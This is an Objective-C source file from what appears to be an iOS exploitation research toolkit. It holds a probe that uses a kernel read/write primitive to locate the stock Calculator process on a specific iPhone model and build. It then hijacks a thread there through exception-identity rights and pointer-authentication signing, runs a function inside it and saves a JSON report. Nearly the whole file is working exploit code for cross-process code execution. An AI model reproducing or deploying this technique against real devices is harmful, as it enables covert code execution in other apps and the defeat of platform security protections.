#import "CNDPhysicalCalculatorPACProbe.h"

#import "TaskRop/RemoteCall.h"
#import "kexploit/CNDLabKernelProvider.h"
#import "kexploit/kexploit_opa334.h"
#import "kexploit/krw.h"
#import "kexploit/kutils.h"
#import "kexploit/offsets.h"

#include <stdint.h>
#include <sys/sysctl.h>

#define CND_CALCULATOR_PAC_PRODUCT "iPhone17,2"
#define CND_CALCULATOR_PAC_BUILD "23A341"
#define CND_CALCULATOR_PAC_PROCESS "Calculator"
#define CND_CALCULATOR_PAC_BUNDLE "com.apple.calculator"
#define CND_CALCULATOR_PAC_TIMEOUT_MS 15000

static volatile int32_t gCNDPhysicalCalculatorPACProbeRunning;

static NSString *CNDCalculatorPACSysctlString(const char *name)
{
    char value[96] = {0};
    size_t length = sizeof(value);
    if (sysctlbyname(name, value, &length, NULL, 0) != 0 || !value[0]) {
        return @"";
    }
    return [NSString stringWithUTF8String:value] ?: @"";
}

static NSString *CNDCalculatorPACHex(uint64_t value)
{
    return [NSString stringWithFormat:@"0x%016llx",
        (unsigned long long)value];
}

static NSDictionary<NSString *, id> *CNDCalculatorPACSnapshotDictionary(
    const RemoteCallDebugSnapshot *snapshot)
{
    if (!snapshot) return @{};
    return @{
        @"hasLocalState": @(snapshot->hasLocalState),
        @"success": @(snapshot->success),
        @"labBackend": @(snapshot->labBackend),
        @"pid": @(snapshot->pid),
        @"proc": CNDCalculatorPACHex(snapshot->procAddr),
        @"task": CNDCalculatorPACHex(snapshot->taskAddr),
        @"trojanThread": CNDCalculatorPACHex(snapshot->trojanThreadAddr),
        @"stableCalls": @(snapshot->stableCalls),
        @"stableFailures": @(snapshot->stableFailures),
        @"identityBootstrapRequested":
            @(snapshot->identityBootstrapRequested),
        @"identityMessageValid": @(snapshot->identityMessageValid),
        @"identityThreadRightExact":
            @(snapshot->identityThreadRightExact),
        @"identityTaskRightExact": @(snapshot->identityTaskRightExact),
        @"identityHandlerDowngraded":
            @(snapshot->identityHandlerDowngraded),
        @"identityHandlerRetained":
            @(snapshot->identityHandlerRetained),
        @"identityInitialConversionSucceeded":
            @(snapshot->identityInitialConversionSucceeded),
        @"identityInitialReplySucceeded":
            @(snapshot->identityInitialReplySucceeded),
        @"identityThread": CNDCalculatorPACHex(
            snapshot->identityThreadAddr),
        @"identityTrapAddress": CNDCalculatorPACHex(
            snapshot->identityTrapAddress),
        @"identityConversionCount":
            @(snapshot->identityConversionCount),
        @"identityConversionFailures":
            @(snapshot->identityConversionFailures),
        @"identityConverterUnavailable":
            @(snapshot->identityConverterUnavailable),
        @"identityPACFallbackCount":
            @(snapshot->identityPACFallbackCount),
        @"identityPACFallbackFailures":
            @(snapshot->identityPACFallbackFailures),
        @"lastStableCall": [NSString stringWithUTF8String:
            snapshot->lastStableCall] ?: @"",
        @"lastStableFailure": [NSString stringWithUTF8String:
            snapshot->lastStableFailure] ?: @"",
        @"lastStableFailureReason": [NSString stringWithUTF8String:
            snapshot->lastStableFailureReason] ?: @"",
    };
}

static NSDictionary<NSString *, id> *CNDPhysicalCalculatorPACProbeRunOnce(void)
{
    NSMutableDictionary<NSString *, id> *report = [@{
        @"schema": @"com.zeroxjf.cyanide.physical-calculator-pac-probe",
        @"schemaVersion": @1,
        @"productType": CNDCalculatorPACSysctlString("hw.machine"),
        @"productBuildVersion": CNDCalculatorPACSysctlString(
            "kern.osversion"),
        @"targetProcess": @CND_CALCULATOR_PAC_PROCESS,
        @"targetBundleIdentifier": @CND_CALCULATOR_PAC_BUNDLE,
        @"markerFunction": @"getpid",
        @"exceptionBehaviorInitial":
            @"EXCEPTION_STATE_IDENTITY | MACH_EXCEPTION_CODES",
        @"exceptionBehaviorAfterBootstrap":
            @"EXCEPTION_STATE_IDENTITY | MACH_EXCEPTION_CODES",
        @"conversionDirection": @"THREAD_CONVERT_THREAD_STATE_FROM_SELF",
        @"krwUsed": @YES,
        @"kernelReadUsed": @YES,
        @"kernelWriteUsed": @YES,
        @"kernelCallUsed": @NO,
        @"forgedTaskPortUsed": @NO,
        @"kernelMintedIdentityRightsUsed": @YES,
        @"targetCodeExecuted": @NO,
        @"dylibInjected": @NO,
        @"persistentMutation": @NO,
        @"startedAt": @([[NSDate date] timeIntervalSince1970]),
    } mutableCopy];

    if (!kexploit_krw_ready()) {
        report[@"result"] = @"refused-krw-unavailable";
        report[@"message"] = @"Validated physical KRW is required.";
        goto save;
    }

    uint64_t targetProc = proc_find_by_name(CND_CALCULATOR_PAC_PROCESS);
    uint64_t targetTask = is_kaddr_valid(targetProc)
        ? proc_task(targetProc) : 0;
    pid_t targetPID = is_kaddr_valid(targetProc)
        ? (pid_t)kread32(targetProc + off_proc_p_pid) : 0;
    report[@"targetPIDBefore"] = @(targetPID);
    report[@"targetProcBefore"] = CNDCalculatorPACHex(targetProc);
    report[@"targetTaskBefore"] = CNDCalculatorPACHex(targetTask);
    if (targetPID <= 1 || !is_kaddr_valid(targetProc) ||
        !is_kaddr_valid(targetTask) || proc_find(targetPID) != targetProc ||
        proc_task(targetProc) != targetTask) {
        report[@"result"] = @"refused-calculator-not-resident";
        report[@"message"] =
            @"Open the stock Calculator app and retry while its process is resident.";
        goto save;
    }

    int initResult = init_remote_call_identity_bootstrap_original_thread_only(
        CND_CALCULATOR_PAC_PROCESS, CND_CALCULATOR_PAC_TIMEOUT_MS);
    report[@"remoteCallInitResult"] = @(initResult);
    report[@"remoteCallInitFailure"] = @(
        remote_call_last_init_failure());
    report[@"remoteCallInitFailureDescription"] =
        [NSString stringWithUTF8String:remote_call_init_failure_description(
            remote_call_last_init_failure())] ?: @"unknown";

    RemoteCallDebugSnapshot initialized = {0};
    (void)remote_call_copy_debug_snapshot(&initialized);
    report[@"afterInitialize"] =
        CNDCalculatorPACSnapshotDictionary(&initialized);
    if (initResult != 0) {
        report[@"result"] = @"failed-identity-bootstrap";
        goto save;
    }

    uint64_t markerPID = do_remote_call_stable(
        2000, "getpid", 0, 0, 0, 0, 0, 0, 0, 0);
    RemoteCallDebugSnapshot afterMarker = {0};
    (void)remote_call_copy_debug_snapshot(&afterMarker);
    report[@"markerPID"] = @(markerPID);
    report[@"markerMatchedTargetPID"] = @(markerPID == (uint64_t)targetPID);
    report[@"afterMarker"] =
        CNDCalculatorPACSnapshotDictionary(&afterMarker);

    int destroyResult = destroy_remote_call();
    RemoteCallDebugSnapshot afterRestore = {0};
    (void)remote_call_copy_debug_snapshot(&afterRestore);
    report[@"remoteCallDestroyResult"] = @(destroyResult);
    report[@"afterRestore"] =
        CNDCalculatorPACSnapshotDictionary(&afterRestore);

    uint64_t liveProc = proc_find(targetPID);
    uint64_t liveTask = is_kaddr_valid(liveProc) ? proc_task(liveProc) : 0;
    BOOL targetIdentityStable = liveProc == targetProc &&
        liveTask == targetTask;
    report[@"targetProcAfter"] = CNDCalculatorPACHex(liveProc);
    report[@"targetTaskAfter"] = CNDCalculatorPACHex(liveTask);
    report[@"targetIdentityStable"] = @(targetIdentityStable);
    report[@"targetCodeExecuted"] = @(
        markerPID == (uint64_t)targetPID);
    report[@"threadRestored"] = @(destroyResult == 0);
    report[@"publicConverterOnly"] = @(
        afterRestore.identityPACFallbackCount == 0);
    report[@"krwPACContextFallbackUsed"] = @(
        afterRestore.identityPACFallbackCount > 0);

    BOOL publicConverterPath =
        afterRestore.identityConversionCount >= 3 &&
        afterRestore.identityConversionFailures == 0 &&
        afterRestore.identityPACFallbackCount == 0 &&
        afterRestore.identityPACFallbackFailures == 0;
    BOOL physicalKRWFallbackPath =
        initialized.identityConverterUnavailable &&
        initialized.identityConversionFailures == 1 &&
        afterRestore.identityPACFallbackCount >= 3 &&
        afterRestore.identityPACFallbackFailures == 0;
    BOOL signerPathValid = publicConverterPath || physicalKRWFallbackPath;

    BOOL success = initialized.identityBootstrapRequested &&
        initialized.identityMessageValid &&
        initialized.identityThreadRightExact &&
        initialized.identityTaskRightExact &&
        initialized.identityHandlerRetained &&
        initialized.identityInitialConversionSucceeded &&
        initialized.identityInitialReplySucceeded &&
        markerPID == (uint64_t)targetPID &&
        (afterMarker.identityConversionCount +
            afterMarker.identityPACFallbackCount) >= 2 &&
        destroyResult == 0 &&
        signerPathValid &&
        targetIdentityStable;
    report[@"exactCalculatorCrossProcessPACExecution"] = @(success);
    report[@"result"] = success
        ? @"success-calculator-cross-process-pac-execution"
        : @"failed-calculator-cross-process-pac-execution";

save:
    report[@"completedAt"] = @([[NSDate date] timeIntervalSince1970]);
    NSArray<NSString *> *documents = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *directory = documents.firstObject ?: NSTemporaryDirectory();
    NSString *path = [directory stringByAppendingPathComponent:
        @"CNDPhysicalCalculatorPACProbe.json"];
    report[@"reportPath"] = path;
    NSData *data = [NSJSONSerialization dataWithJSONObject:report
        options:NSJSONWritingPrettyPrinted | NSJSONWritingSortedKeys
        error:nil];
    report[@"reportSaved"] = @(data && [data writeToFile:path
        options:NSDataWritingAtomic error:nil]);
    return [report copy];
}

BOOL CNDPhysicalCalculatorPACProbeIsSupported(
    NSString * _Nullable * _Nullable reasonOut)
{
    NSString *product = CNDCalculatorPACSysctlString("hw.machine");
    NSString *build = CNDCalculatorPACSysctlString("kern.osversion");
    BOOL physical = !cnd_lab_vphone_guest();
    BOOL supported = physical &&
        [product isEqualToString:@CND_CALCULATOR_PAC_PRODUCT] &&
        [build isEqualToString:@CND_CALCULATOR_PAC_BUILD];
    if (reasonOut) {
        if (!physical) {
            *reasonOut = @"Physical-device Calculator probe; vPhone is refused.";
        } else if (supported) {
            *reasonOut = @"Exact physical iPhone17,2 / 23A341 target matched.";
        } else {
            *reasonOut = [NSString stringWithFormat:
                @"Requires physical iPhone17,2 on 23A341; this device is %@ on %@.",
                product.length ? product : @"unknown hardware",
                build.length ? build : @"unknown build"];
        }
    }
    return supported;
}

BOOL CNDPhysicalCalculatorPACProbeIsRunning(void)
{
    return __sync_fetch_and_add(
        &gCNDPhysicalCalculatorPACProbeRunning, 0) != 0;
}

void CNDPhysicalCalculatorPACProbeRun(
    CNDPhysicalCalculatorPACProbeCompletion completion)
{
    if (!completion) return;
    NSString *supportReason = nil;
    if (!CNDPhysicalCalculatorPACProbeIsSupported(&supportReason)) {
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(@{
                @"result": @"refused-unsupported-device",
                @"message": supportReason ?: @"Unsupported device.",
            });
        });
        return;
    }
    if (!__sync_bool_compare_and_swap(
            &gCNDPhysicalCalculatorPACProbeRunning, 0, 1)) {
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(@{
                @"result": @"refused-already-running",
                @"message": @"The Calculator PAC probe is already running.",
            });
        });
        return;
    }

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSDictionary<NSString *, id> *report =
            CNDPhysicalCalculatorPACProbeRunOnce();
        __sync_lock_release(&gCNDPhysicalCalculatorPACProbeRunning);
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(report ?: @{ @"result": @"unknown-result" });
        });
    });
}
